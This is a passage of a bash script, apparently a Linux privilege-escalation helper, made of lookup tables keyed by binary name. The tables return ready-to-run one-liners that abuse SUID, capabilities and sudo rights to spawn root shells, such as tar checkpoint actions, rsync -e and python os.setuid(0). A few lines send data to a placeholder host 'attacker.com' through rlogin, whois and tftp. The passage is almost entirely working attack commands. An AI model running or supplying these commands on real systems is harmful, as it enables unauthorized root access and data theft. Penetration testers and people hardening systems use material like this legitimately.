qpdf --show-attachment=x /path/to/output-file' ;;
    rc) echo 'rc' ;;
    readelf) echo 'readelf -a @/path/to/input-file' ;;
    redis) echo 'redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save' ;;
    restic) echo 'RESTIC_PASSWORD_COMMAND='\''/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"'\'' restic backup' ;;
    rev) echo 'rev /path/to/input-file | rev' ;;
    rlogin) echo 'rlogin -l DATA -p 12345 attacker.com' ;;
    rlwrap) echo 'rlwrap /bin/sh -p' ;;
    rsync) echo 'rsync -e '\''/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"'\'' x:x' ;;
    rtorrent) echo 'echo '\''execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"'\'' >~/.rtorrent.rc
rtorrent' ;;
    run-parts) echo 'run-parts --new-session --regex '\''^sh$'\'' /bin --arg='\''-p'\''' ;;
    runscript) echo 'echo '\''! exec /bin/sh'\'' >/path/to/temp-file
runscript /path/to/temp-file' ;;
    sash) echo 'sash' ;;
    scanmem) echo 'scanmem
shell /bin/sh' ;;
    scp) echo 'echo '\''exec /bin/sh 0<&2 1>&2'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:' ;;
    script) echo 'script -q /dev/null' ;;
    scrot) echo 'scrot -e /bin/sh' ;;
    sed) echo 'sed -n '\''1e exec /bin/sh 1>&0'\'' /etc/hosts' ;;
    setarch) echo 'setarch -3 /bin/sh -p' ;;
    setcap) echo 'setcap cap_setuid+ep /path/to/command' ;;
    setfacl) echo 'setfacl -m u:$(id -un):rwx /path/to/input-file' ;;
    setlock) echo 'setlock - /bin/sh -p' ;;
    sftp) echo 'sftp user@attacker.com
!/bin/sh' ;;
    shred) echo 'shred -u /path/to/output-file' ;;
    shuf) echo 'shuf -z /path/to/input-file' ;;
    slsh) echo 'slsh -e '\''system("/bin/sh")'\''' ;;
    socat) echo 'socat - '\''exec:/bin/sh -p,pty,ctty,raw,echo=0'\''' ;;
    socket) echo 'socket -svp '\''/bin/sh -i'\'' 12345' ;;
    soelim) echo 'soelim /path/to/input-file' ;;
    softlimit) echo 'softlimit /bin/sh -p' ;;
    sort) echo 'sort -m /path/to/input-file' ;;
    split) echo 'split --filter='\''/bin/sh -i 0<&2 1>&2'\'' /etc/hosts' ;;
    sqlite3) echo 'sqlite3 /dev/null '\''.shell /bin/sh'\''' ;;
    ss) echo 'ss -a -F /path/to/input-file' ;;
    ssh) echo 'ssh localhost /bin/sh' ;;
    ssh-agent) echo 'ssh-agent /bin/sh -p' ;;
    ssh-keygen) echo 'ssh-keygen -D /path/to/lib.so' ;;
    ssh-keyscan) echo 'ssh-keyscan -f /path/to/input-file' ;;
    sshpass) echo 'sshpass /bin/sh -p' ;;
    start-stop-daemon) echo 'start-stop-daemon -S -x /bin/sh -- -p' ;;
    stdbuf) echo 'stdbuf -i0 /bin/sh -p' ;;
    strace) echo 'strace -o /dev/null /bin/sh -p' ;;
    strings) echo 'strings /path/to/input-file' ;;
    sysctl) echo 'sysctl '\''kernel.core_pattern=|/path/to/command'\''' ;;
    systemctl) echo 'echo '\''[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target'\'' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service' ;;
    tac) echo 'tac -s '\''RANDOM'\'' /path/to/input-file' ;;
    tail) echo 'tail -c+0 /path/to/input-file' ;;
    tar) echo 'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' ;;
    task) echo 'task execute /bin/sh' ;;
    tasksh) echo 'tasksh
!/bin/sh' ;;
    tbl) echo 'tbl /path/to/input-file' ;;
    tclsh) echo 'tclsh' ;;
    tcpdump) echo 'tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user' ;;
    tcsh) echo 'tcsh -b' ;;
    tdbtool) echo 'tdbtool
! /bin/sh' ;;
    tee) echo 'echo DATA | tee /path/to/output-file' ;;
    telnet) echo 'telnet
!/bin/sh' ;;
    terraform) echo 'terraform console
file("/path/to/input-file")' ;;
    tex) echo 'tex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    tftp) echo 'tftp attacker.com
get /path/to/input-file' ;;
    tic) echo 'tic -C /path/to/input-file' ;;
    time) echo 'time /bin/sh -p' ;;
    timeout) echo 'timeout 0 /bin/sh -p' ;;
    tmate) echo 'tmate -c /bin/sh' ;;
    tmux) echo 'tmux -c /bin/sh' ;;
    troff) echo 'troff /path/to/input-file' ;;
    ul) echo 'ul /path/to/input-file' ;;
    unexpand) echo 'unexpand -t999 /path/to/input-file' ;;
    uniq) echo 'uniq /path/to/input-file' ;;
    unshare) echo 'unshare -r /bin/sh' ;;
    unsquashfs) echo 'unsquashfs shell
./squashfs-root/sh -p' ;;
    unzip) echo 'unzip -K shell.zip
./sh -p' ;;
    update-alternatives) echo 'echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0' ;;
    urlget) echo 'urlget - /path/to/input-file' ;;
    uuencode) echo 'uuencode /path/to/input-file /dev/stdout | uudecode' ;;
    varnishncsa) echo 'varnishncsa -g request -q '\''ReqURL ~ "/xxxxxxxxxx"'\'' -F '\''%{yyy}i'\'' -w /path/to/output-file' ;;
    vi) echo 'vi -c '\'':!/bin/sh'\'' /dev/null' ;;
    vigr) echo 'vigr' ;;
    vim) echo 'vim -c '\'':redir! >/path/to/output-file | echo "DATA" | redir END | q'\''' ;;
    vipw) echo 'vipw' ;;
    w3m) echo 'w3m -dump /path/to/input-file' ;;
    watch) echo 'watch -x /bin/sh -p -c '\''reset; exec /bin/sh -p 1>&0 2>&0'\''' ;;
    wc) echo 'wc --files0-from /path/to/input-file' ;;
    wget) echo 'echo -e '\''#!/bin/sh -p\\n/bin/sh -p 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0' ;;
    whiptail) echo 'whiptail --textbox --scrolltext /path/to/input-file 0 0' ;;
    whois) echo 'whois -h attacker.com -p 12345 x' ;;
    wish) echo 'wish' ;;
    xargs) echo 'xargs -a /dev/null /bin/sh -p' ;;
    xdotool) echo 'xdotool exec --sync /bin/sh -p' ;;
    xmodmap) echo 'xmodmap -v /path/to/input-file' ;;
    xmore) echo 'xmore /path/to/input-file' ;;
    xpad) echo 'xpad -f /path/to/input-file' ;;
    xxd) echo 'xxd /path/to/input-file | xxd -r' ;;
    xz) echo 'xz -c /path/to/input-file | xz -d' ;;
    yash) echo 'yash' ;;
    zic) echo 'echo '\''Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -'\'' >/path/to/temp-file
echo '\''Zone Test 2:00 Jordan CE%sT'\'' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file' ;;
    zip) echo 'zip /path/to/temp-file /etc/hosts -T -TT '\''/bin/sh #'\''' ;;
    zless) echo 'zless /path/to/input-file' ;;
    zsh) echo 'zsh' ;;
    zsoelim) echo 'zsoelim /path/to/input-file' ;;
  esac
}

# ========== CAPABILITIES LOOKUP ==========
is_cap_exploitable() {
  local b="$1"
  case "$b" in
    gzip) echo 'file-read|CAP_DAC_OVERRIDE'; return 0 ;;
    node) echo 'shell|CAP_SETUID'; return 0 ;;
    perl) echo 'shell|CAP_SETUID'; return 0 ;;
    php) echo 'shell,shell,shell,shell|CAP_SETUID;CAP_SETUID;CAP_SETUID;CAP_SETUID'; return 0 ;;
    python) echo 'library-load,shell|CAP_SETUID;CAP_SETUID'; return 0 ;;
    ruby) echo 'shell|CAP_SETUID'; return 0 ;;
    tclsh) echo 'library-load|'; return 0 ;;
    *) return 1 ;;
  esac
}

get_cap_exploit() {
  local b="$1"
  case "$b" in
    gzip) echo 'gzip -c /path/to/input-file | gzip -d' ;;
    node) echo 'node -e '\''process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'\''' ;;
    perl) echo 'perl -e '\''use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'\''' ;;
    php) echo 'php -r '\''posix_setuid(0); system("/bin/sh -i");'\''' ;;
    python) echo 'python -c '\''import os; os.setuid(0); os.execl("/bin/sh", "sh")'\''' ;;
    ruby) echo 'ruby -e '\''Process::Sys.setuid(0); exec "/bin/sh"'\''' ;;
    tclsh) echo 'tclsh
load /path/to/lib.so x' ;;
  esac
}

# ========== SUDO LOOKUP ==========
is_sudo_exploitable() {
  local b="$1"
  case "$b" in
    7z) echo 'file-read'; return 0 ;;
    R) echo 'shell'; return 0 ;;
    aa-exec) echo 'shell'; return 0 ;;
    ab) echo 'download,upload'; return 0 ;;
    acr) echo 'command'; return 0 ;;
    alpine) echo 'file-read'; return 0 ;;
    ansible-playbook) echo 'shell'; return 0 ;;
    ansible-test) echo 'shell'; return 0 ;;
    aoss) echo 'shell'; return 0 ;;
    apache2) echo 'file-read,file-read'; return 0 ;;
    apache2ctl) echo 'file-read'; return 0 ;;
    apt-get) echo 'inherit,shell,shell'; return 0 ;;
    aptitude) echo 'inherit'; return 0 ;;
    ar) echo 'file-read'; return 0 ;;
    arch-nspawn) echo 'shell'; return 0 ;;
    aria2c) echo 'command,command,download,file-read'; return 0 ;;
    arj) echo 'file-read,file-write'; return 0 ;;
    arp) echo 'file-read'; return 0 ;;
    as) echo 'file-read'; return 0 ;;
    ascii-xfr) echo 'file-read'; return 0 ;;
    ascii85) echo 'file-read'; return 0 ;;
    ash) echo 'file-write,shell'; return 0 ;;
    aspell) echo 'file-read,file-read'; return 0 ;;
    asterisk) echo 'shell'; return 0 ;;
    at) echo 'command,shell'; return 0 ;;
    atobm) echo 'file-read'; return 0 ;;
    autoconf) echo 'shell'; return 0 ;;
    autoheader) echo 'shell'; return 0 ;;
    autoreconf) echo 'shell'; return 0 ;;
    aws) echo 'file-read,inherit'; return 0 ;;
    base32) echo 'file-read'; return 0 ;;
    base58) echo 'file-read'; return 0 ;;
    base64) echo 'file-read'; return 0 ;;
    basenc) echo 'file-read'; return 0 ;;
    basez) echo 'file-read'; return 0 ;;
    bash) echo 'download,download,file-read,file-read,file-write,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    bashbug) echo 'inherit'; return 0 ;;
    batcat) echo 'inherit'; return 0 ;;
    bbot) echo 'file-read'; return 0 ;;
    bc) echo 'file-read'; return 0 ;;
    bconsole) echo 'file-read,shell'; return 0 ;;
    borg) echo 'shell'; return 0 ;;
    bpftrace) echo 'shell,shell,shell'; return 0 ;;
    bridge) echo 'file-read'; return 0 ;;
    bundle) echo 'inherit,inherit,shell,shell,shell'; return 0 ;;
    busctl) echo 'inherit,shell,shell'; return 0 ;;
    busybox) echo 'inherit,inherit,reverse-shell,upload'; return 0 ;;
    byebug) echo 'inherit'; return 0 ;;
    bzip2) echo 'file-read'; return 0 ;;
    cabal) echo 'shell'; return 0 ;;
    cancel) echo 'upload'; return 0 ;;
    capsh) echo 'shell'; return 0 ;;
    cargo) echo 'inherit'; return 0 ;;
    cat) echo 'file-read'; return 0 ;;
    cdist) echo 'shell'; return 0 ;;
    certbot) echo 'shell'; return 0 ;;
    chattr) echo 'privilege-escalation'; return 0 ;;
    check_by_ssh) echo 'shell'; return 0 ;;
    check_cups) echo 'file-read'; return 0 ;;
    check_log) echo 'file-read,file-write'; return 0 ;;
    check_memory) echo 'file-read'; return 0 ;;
    check_raid) echo 'file-read'; return 0 ;;
    check_ssl_cert) echo 'shell'; return 0 ;;
    check_statusfile) echo 'file-read'; return 0 ;;
    chmod) echo 'privilege-escalation'; return 0 ;;
    choom) echo 'shell'; return 0 ;;
    chown) echo 'privilege-escalation'; return 0 ;;
    chroot) echo 'shell'; return 0 ;;
    chrt) echo 'shell'; return 0 ;;
    clamscan) echo 'file-read'; return 0 ;;
    clisp) echo 'shell'; return 0 ;;
    cmake) echo 'file-read,shell'; return 0 ;;
    cmp) echo 'file-read'; return 0 ;;
    cobc) echo 'shell'; return 0 ;;
    code) echo 'download'; return 0 ;;
    codex) echo 'shell'; return 0 ;;
    column) echo 'file-read'; return 0 ;;
    comm) echo 'file-read'; return 0 ;;
    composer) echo 'shell'; return 0 ;;
    cowsay) echo 'inherit'; return 0 ;;
    cowthink) echo 'inherit'; return 0 ;;
    cp) echo 'file-read,file-write,privilege-escalation,privilege-escalation'; return 0 ;;
    cpio) echo 'file-read,file-read,file-write,shell'; return 0 ;;
    cpulimit) echo 'shell'; return 0 ;;
    crash) echo 'command,inherit'; return 0 ;;
    crontab) echo 'command,inherit'; return 0 ;;
    csh) echo 'file-write,shell'; return 0 ;;
    csplit) echo 'file-read,file-write'; return 0 ;;
    csvtool) echo 'file-read,file-write,shell'; return 0 ;;
    ctr) echo 'shell'; return 0 ;;
    cupsfilter) echo 'file-read'; return 0 ;;
    curl) echo 'download,file-read,file-write,library-load,upload,upload,upload'; return 0 ;;
    cut) echo 'file-read'; return 0 ;;
    dash) echo 'file-write,shell'; return 0 ;;
    date) echo 'file-read'; return 0 ;;
    dc) echo 'shell'; return 0 ;;
    dd) echo 'file-read,file-write'; return 0 ;;
    debugfs) echo 'shell'; return 0 ;;
    dhclient) echo 'shell'; return 0 ;;
    dialog) echo 'file-read'; return 0 ;;
    diff) echo 'file-read,file-read'; return 0 ;;
    dig) echo 'file-read'; return 0 ;;
    distcc) echo 'shell'; return 0 ;;
    dmesg) echo 'file-read,inherit'; return 0 ;;
    dmsetup) echo 'shell'; return 0 ;;
    dnf) echo 'command'; return 0 ;;
    dnsmasq) echo 'command'; return 0 ;;
    doas) echo 'shell'; return 0 ;;
    docker) echo 'file-read,file-write,shell,shell'; return 0 ;;
    dos2unix) echo 'file-read,file-write'; return 0 ;;
    dosbox) echo 'file-read,file-read,file-write'; return 0 ;;
    dotnet) echo 'file-read,shell'; return 0 ;;
    dpkg) echo 'inherit,shell'; return 0 ;;
    dstat) echo 'inherit'; return 0 ;;
    dvips) echo 'shell'; return 0 ;;
    easyrsa) echo 'shell'; return 0 ;;
    eb) echo 'inherit'; return 0 ;;
    ed) echo 'file-read,file-write,shell'; return 0 ;;
    efax) echo 'file-read'; return 0 ;;
    egrep) echo 'file-read'; return 0 ;;
    elvish) echo 'file-read,file-write,shell'; return 0 ;;
    emacs) echo 'file-read,file-write,shell'; return 0 ;;
    enscript) echo 'shell'; return 0 ;;
    env) echo 'shell'; return 0 ;;
    eqn) echo 'file-read'; return 0 ;;
    espeak) echo 'file-read'; return 0 ;;
    ex) echo 'inherit,shell'; return 0 ;;
    exiftool) echo 'file-read,file-write,file-write,file-write,file-write'; return 0 ;;
    expand) echo 'file-read'; return 0 ;;
    expect) echo 'file-read,shell'; return 0 ;;
    facter) echo 'inherit,inherit'; return 0 ;;
    fail2ban-client) echo 'command,command'; return 0 ;;
    fastfetch) echo 'command,file-read,shell'; return 0 ;;
    ffmpeg) echo 'library-load'; return 0 ;;
    fgrep) echo 'file-read'; return 0 ;;
    file) echo 'file-read,file-read'; return 0 ;;
    find) echo 'file-read,file-write,shell'; return 0 ;;
    finger) echo 'download,upload'; return 0 ;;
    firejail) echo 'shell'; return 0 ;;
    fish) echo 'shell'; return 0 ;;
    flock) echo 'shell'; return 0 ;;
    fmt) echo 'file-read,file-read'; return 0 ;;
    fold) echo 'file-read'; return 0 ;;
    forge) echo 'shell'; return 0 ;;
    fping) echo 'file-read'; return 0 ;;
    ftp) echo 'download,shell,upload'; return 0 ;;
    fzf) echo 'command,shell'; return 0 ;;
    gawk) echo 'bind-shell,file-read,file-write,reverse-shell,shell'; return 0 ;;
    gcc) echo 'file-read,file-read,file-write,shell'; return 0 ;;
    gcloud) echo 'inherit'; return 0 ;;
    gcore) echo 'file-read'; return 0 ;;
    gdb) echo 'file-write'; return 0 ;;
    gem) echo 'inherit,inherit,inherit,shell'; return 0 ;;
    genie) echo 'shell'; return 0 ;;
    genisoimage) echo 'file-read,file-read'; return 0 ;;
    getent) echo 'privilege-escalation'; return 0 ;;
    ghc) echo 'shell'; return 0 ;;
    ghci) echo 'shell'; return 0 ;;
    ginsh) echo 'shell'; return 0 ;;
    git) echo 'file-read,file-write,inherit,inherit,shell,shell,shell'; return 0 ;;
    gnuplot) echo 'shell'; return 0 ;;
    go) echo 'bind-shell,file-read,file-write,reverse-shell,shell'; return 0 ;;
    grc) echo 'shell'; return 0 ;;
    grep) echo 'file-read'; return 0 ;;
    gtester) echo 'file-write,shell'; return 0 ;;
    guile) echo 'shell'; return 0 ;;
    gzip) echo 'file-read'; return 0 ;;
    hashcat) echo 'file-write'; return 0 ;;
    head) echo 'file-read'; return 0 ;;
    hexdump) echo 'file-read'; return 0 ;;
    hg) echo 'shell'; return 0 ;;
    highlight) echo 'file-read'; return 0 ;;
    hping3) echo 'shell,upload'; return 0 ;;
    iconv) echo 'file-read,file-write'; return 0 ;;
    iftop) echo 'shell'; return 0 ;;
    install) echo 'privilege-escalation'; return 0 ;;
    ionice) echo 'shell'; return 0 ;;
    ip) echo 'file-read,shell,shell'; return 0 ;;
    iptables-save) echo 'file-write'; return 0 ;;
    ispell) echo 'shell'; return 0 ;;
    java) echo 'shell'; return 0 ;;
    jjs) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    joe) echo 'shell'; return 0 ;;
    join) echo 'file-read'; return 0 ;;
    journalctl) echo 'inherit'; return 0 ;;
    jq) echo 'file-read'; return 0 ;;
    jrunscript) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    jshell) echo 'file-read,file-write,shell'; return 0 ;;
    jtag) echo 'shell'; return 0 ;;
    julia) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    ksshell) echo 'file-read'; return 0 ;;
    ksu) echo 'shell'; return 0 ;;
    kubectl) echo 'shell,upload'; return 0 ;;
    last) echo 'file-read'; return 0 ;;
    latex) echo 'file-read,file-write,shell'; return 0 ;;
    latexmk) echo 'file-read'; return 0 ;;
    ld.so) echo 'shell'; return 0 ;;
    ldconfig) echo 'library-load'; return 0 ;;
    less) echo 'command,file-read,file-read,file-read,file-write,inherit,shell,shell,shell'; return 0 ;;
    lftp) echo 'shell'; return 0 ;;
    links) echo 'file-read'; return 0 ;;
    ln) echo 'privilege-escalation'; return 0 ;;
    loginctl) echo 'shell'; return 0 ;;
    logrotate) echo 'file-read,file-write,shell'; return 0 ;;
    logsave) echo 'shell'; return 0 ;;
    look) echo 'file-read'; return 0 ;;
    lp) echo 'upload'; return 0 ;;
    ltrace) echo 'file-read,file-write,shell'; return 0 ;;
    lua) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    lwp-download) echo 'download,file-read,file-write,file-write'; return 0 ;;
    lwp-request) echo 'file-read'; return 0 ;;
    lxd) echo 'shell,shell'; return 0 ;;
    m4) echo 'command,file-read,shell'; return 0 ;;
    mail) echo 'shell,shell'; return 0 ;;
    make) echo 'file-read,file-write,shell'; return 0 ;;
    man) echo 'file-read,inherit,shell'; return 0 ;;
    mawk) echo 'file-read,file-write,shell'; return 0 ;;
    minicom) echo 'shell,shell'; return 0 ;;
    more) echo 'file-read,shell'; return 0 ;;
    mosh-server) echo 'shell'; return 0 ;;
    mosquitto) echo 'file-read'; return 0 ;;
    mount) echo 'privilege-escalation'; return 0 ;;
    msfconsole) echo 'inherit'; return 0 ;;
    msgattrib) echo 'file-read'; return 0 ;;
    msgcat) echo 'file-read'; return 0 ;;
    msgconv) echo 'file-read'; return 0 ;;
    msgfilter) echo 'file-read,shell'; return 0 ;;
    msgmerge) echo 'file-read'; return 0 ;;
    msguniq) echo 'file-read'; return 0 ;;
    mtr) echo 'file-read'; return 0 ;;
    multitime) echo 'shell'; return 0 ;;
    mutt) echo 'file-read'; return 0 ;;
    mv) echo 'file-write,privilege-escalation'; return 0 ;;
    mypy) echo 'file-read,file-write'; return 0 ;;
    mysql) echo 'library-load,shell'; return 0 ;;
    nano) echo 'file-read,file-write,shell,shell'; return 0 ;;
    nasm) echo 'file-read'; return 0 ;;
    nc) echo 'bind-shell,download,download,reverse-shell,upload,upload'; return 0 ;;
    ncdu) echo 'shell'; return 0 ;;
    ncftp) echo 'shell'; return 0 ;;
    neofetch) echo 'file-read,shell'; return 0 ;;
    nft) echo 'file-read'; return 0 ;;
    nginx) echo 'download,library-load,upload'; return 0 ;;
    nice) echo 'shell'; return 0 ;;
    nl) echo 'file-read'; return 0 ;;
    nm) echo 'file-read'; return 0 ;;
    nmap) echo 'file-read,file-write'; return 0 ;;
    node) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    nohup) echo 'command,shell'; return 0 ;;
    npm) echo 'shell,shell,shell'; return 0 ;;
    nroff) echo 'file-read,shell'; return 0 ;;
    nsenter) echo 'shell'; return 0 ;;
    ntpdate) echo 'file-read'; return 0 ;;
    octave) echo 'file-read,file-write,shell'; return 0 ;;
    od) echo 'file-read'; return 0 ;;
    opencode) echo 'command'; return 0 ;;
    openssl) echo 'download,file-read,file-write,file-write,library-load,reverse-shell,upload'; return 0 ;;
    openvpn) echo 'file-read,shell'; return 0 ;;
    openvt) echo 'command'; return 0 ;;
    opkg) echo 'shell'; return 0 ;;
    pandoc) echo 'file-read,file-write'; return 0 ;;
    passwd) echo 'privilege-escalation'; return 0 ;;
    paste) echo 'file-read'; return 0 ;;
    pax) echo 'file-read'; return 0 ;;
    pdflatex) echo 'file-read,file-write,shell'; return 0 ;;
    pdftex) echo 'shell'; return 0 ;;
    perf) echo 'shell'; return 0 ;;
    perl) echo 'download,file-read,reverse-shell,shell,shell,upload'; return 0 ;;
    perlbug) echo 'shell'; return 0 ;;
    pexec) echo 'shell'; return 0 ;;
    pg) echo 'file-read,shell'; return 0 ;;
    php) echo 'command,command,command,download,file-read,file-write,reverse-shell,shell,shell,shell,shell,upload'; return 0 ;;
    pic) echo 'file-read,shell'; return 0 ;;
    pidstat) echo 'shell'; return 0 ;;
    pkexec) echo 'shell'; return 0 ;;
    pkg) echo 'command'; return 0 ;;
    plymouth) echo 'shell'; return 0 ;;
    podman) echo 'shell'; return 0 ;;
    posh) echo 'shell'; return 0 ;;
    pr) echo 'file-read'; return 0 ;;
    procmail) echo 'command'; return 0 ;;
    pry) echo 'inherit'; return 0 ;;
    psftp) echo 'shell'; return 0 ;;
    psql) echo 'inherit,shell'; return 0 ;;
    ptx) echo 'file-read'; return 0 ;;
    puppet) echo 'file-read,file-write,shell'; return 0 ;;
    pwsh) echo 'file-write,shell'; return 0 ;;
    pygmentize) echo 'file-read'; return 0 ;;
    pyright) echo 'file-read,file-read,file-read'; return 0 ;;
    python) echo 'download,file-read,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    qpdf) echo 'file-read'; return 0 ;;
    rake) echo 'file-read'; return 0 ;;
    ranger) echo 'shell'; return 0 ;;
    rc) echo 'shell'; return 0 ;;
    readelf) echo 'file-read'; return 0 ;;
    redcarpet) echo 'file-read'; return 0 ;;
    redis) echo 'file-write'; return 0 ;;
    restic) echo 'command,command,shell,shell,upload'; return 0 ;;
    rev) echo 'file-read'; return 0 ;;
    rlogin) echo 'upload'; return 0 ;;
    rlwrap) echo 'file-write,shell'; return 0 ;;
    rpm) echo 'command'; return 0 ;;
    rsync) echo 'shell'; return 0 ;;
    rsyslogd) echo 'command'; return 0 ;;
    rtorrent) echo 'shell'; return 0 ;;
    ruby) echo 'download,file-read,file-write,library-load,reverse-shell,shell,upload'; return 0 ;;
    run-mailcap) echo 'inherit,inherit'; return 0 ;;
    run-parts) echo 'shell,shell'; return 0 ;;
    runscript) echo 'shell'; return 0 ;;
    rustc) echo 'file-read,file-write,inherit'; return 0 ;;
    rustdoc) echo 'file-read,file-write'; return 0 ;;
    rustfmt) echo 'file-read'; return 0 ;;
    rustup) echo 'command,shell'; return 0 ;;
    sash) echo 'shell'; return 0 ;;
    scanmem) echo 'shell'; return 0 ;;
    scp) echo 'download,shell,shell,upload'; return 0 ;;
    screen) echo 'file-write,file-write,shell'; return 0 ;;
    script) echo 'file-write,shell'; return 0 ;;
    scrot) echo 'shell'; return 0 ;;
    sed) echo 'file-read,file-write,shell,shell'; return 0 ;;
    service) echo 'shell'; return 0 ;;
    setarch) echo 'shell'; return 0 ;;
    setcap) echo 'privilege-escalation'; return 0 ;;
    setfacl) echo 'privilege-escalation'; return 0 ;;
    setlock) echo 'shell'; return 0 ;;
    sftp) echo 'download,shell,upload'; return 0 ;;
    sg) echo 'shell'; return 0 ;;
    shred) echo 'file-write'; return 0 ;;
    shuf) echo 'file-read,file-write'; return 0 ;;
    slsh) echo 'shell'; return 0 ;;
    smbclient) echo 'download,shell,upload'; return 0 ;;
    snap) echo 'command'; return 0 ;;
    socat) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    socket) echo 'bind-shell,reverse-shell'; return 0 ;;
    soelim) echo 'file-read'; return 0 ;;
    softlimit) echo 'shell'; return 0 ;;
    sort) echo 'file-read,file-write'; return 0 ;;
    split) echo 'file-read,file-write,shell'; return 0 ;;
    sqlite3) echo 'file-read,file-write,shell'; return 0 ;;
    ss) echo 'file-read'; return 0 ;;
    ssh) echo 'download,file-read,shell,shell,shell,upload'; return 0 ;;
    ssh-agent) echo 'shell'; return 0 ;;
    ssh-copy-id) echo 'file-read,file-write'; return 0 ;;
    ssh-keygen) echo 'library-load'; return 0 ;;
    ssh-keyscan) echo 'file-read'; return 0 ;;
    sshfs) echo 'command,shell'; return 0 ;;
    sshpass) echo 'shell'; return 0 ;;
    sshuttle) echo 'shell'; return 0 ;;
    start-stop-daemon) echo 'shell'; return 0 ;;
    stdbuf) echo 'shell'; return 0 ;;
    strace) echo 'file-write,shell'; return 0 ;;
    strings) echo 'file-read'; return 0 ;;
    su) echo 'shell'; return 0 ;;
    sudo) echo 'shell'; return 0 ;;
    sysctl) echo 'command,file-read'; return 0 ;;
    systemctl) echo 'inherit,shell,shell'; return 0 ;;
    systemd-resolve) echo 'inherit'; return 0 ;;
    systemd-run) echo 'command,shell,shell'; return 0 ;;
    tac) echo 'file-read'; return 0 ;;
    tail) echo 'file-read'; return 0 ;;
    tailscale) echo 'upload'; return 0 ;;
    tar) echo 'download,file-read,file-write,shell,shell,shell,upload'; return 0 ;;
    task) echo 'shell'; return 0 ;;
    taskset) echo 'shell'; return 0 ;;
    tasksh) echo 'shell'; return 0 ;;
    tbl) echo 'file-read'; return 0 ;;
    tclsh) echo 'library-load,reverse-shell,shell'; return 0 ;;
    tcpdump) echo 'command,command,file-write'; return 0 ;;
    tcsh) echo 'file-write,shell'; return 0 ;;
    tdbtool) echo 'shell'; return 0 ;;
    tee) echo 'file-write'; return 0 ;;
    telnet) echo 'reverse-shell,shell'; return 0 ;;
    terraform) echo 'file-read'; return 0 ;;
    tex) echo 'shell'; return 0 ;;
    tftp) echo 'download,upload'; return 0 ;;
    tic) echo 'file-read'; return 0 ;;
    time) echo 'shell'; return 0 ;;
    timedatectl) echo 'inherit'; return 0 ;;
    timeout) echo 'shell'; return 0 ;;
    tmate) echo 'shell'; return 0 ;;
    tmux) echo 'file-read,shell,shell'; return 0 ;;
    top) echo 'shell'; return 0 ;;
    torify) echo 'shell'; return 0 ;;
    torsocks) echo 'shell'; return 0 ;;
    troff) echo 'file-read'; return 0 ;;
    tsc) echo 'file-read,file-write'; return 0 ;;
    ul) echo 'file-read'; return 0 ;;
    unexpand) echo 'file-read'; return 0 ;;
    uniq) echo 'file-read'; return 0 ;;
    unshare) echo 'shell'; return 0 ;;
    unsquashfs) echo 'privilege-escalation'; return 0 ;;
    unzip) echo 'privilege-escalation'; return 0 ;;
    update-alternatives) echo 'file-write'; return 0 ;;
    urlget) echo 'file-read'; return 0 ;;
    uuencode) echo 'file-read'; return 0 ;;
    uv) echo 'shell'; return 0 ;;
    valgrind) echo 'shell'; return 0 ;;
    varnishncsa) echo 'file-write'; return 0 ;;
    vi) echo 'file-read,file-write,shell,shell,shell,shell'; return 0 ;;
    vigr) echo 'inherit'; return 0 ;;
    vim) echo 'file-read'; return 0 ;;
    vipw) echo 'inherit'; return 0 ;;
    virsh) echo 'command,file-write,file-write'; return 0 ;;
    w3m) echo 'file-read'; return 0 ;;
    wall) echo 'file-read'; return 0 ;;
    watch) echo 'shell,shell'; return 0 ;;
    wc) echo 'file-read'; return 0 ;;
    wg-quick) echo 'shell'; return 0 ;;
    wget) echo 'download,file-read,file-write,shell,upload,upload'; return 0 ;;
    whiptail) echo 'file-read'; return 0 ;;
    whois) echo 'download,upload'; return 0 ;;
    wish) echo 'inherit'; return 0 ;;
    xargs) echo 'file-read,shell,shell,shell'; return 0 ;;
    xdg-user-dir) echo 'shell'; return 0 ;;
    xdotool) echo 'shell'; return 0 ;;
    xmodmap) echo 'file-read'; return 0 ;;
    xmore) echo 'file-read'; return 0 ;;
    xpad) echo 'file-read'; return 0 ;;
    xxd) echo 'file-read,file-write'; return 0 ;;
    xz) echo 'file-read'; return 0 ;;
    yarn) echo 'shell,shell,shell'; return 0 ;;
    yash) echo 'shell'; return 0 ;;
    yelp) echo 'file-read'; return 0 ;;
    yt-dlp) echo 'shell'; return 0 ;;
    yum) echo 'command,download'; return 0 ;;
    zathura) echo 'shell'; return 0 ;;
    zcat) echo 'file-read'; return 0 ;;
    zgrep) echo 'file-read'; return 0 ;;
    zic) echo 'command'; return 0 ;;
    zip) echo 'file-read,shell'; return 0 ;;
    zless) echo 'inherit'; return 0 ;;
    zsh) echo 'download,file-read,file-read,file-write,inherit,reverse-shell,shell,upload'; return 0 ;;
    zsoelim) echo 'file-read'; return 0 ;;
    zypper) echo 'shell,shell'; return 0 ;;
    *) return 1 ;;
  esac
}

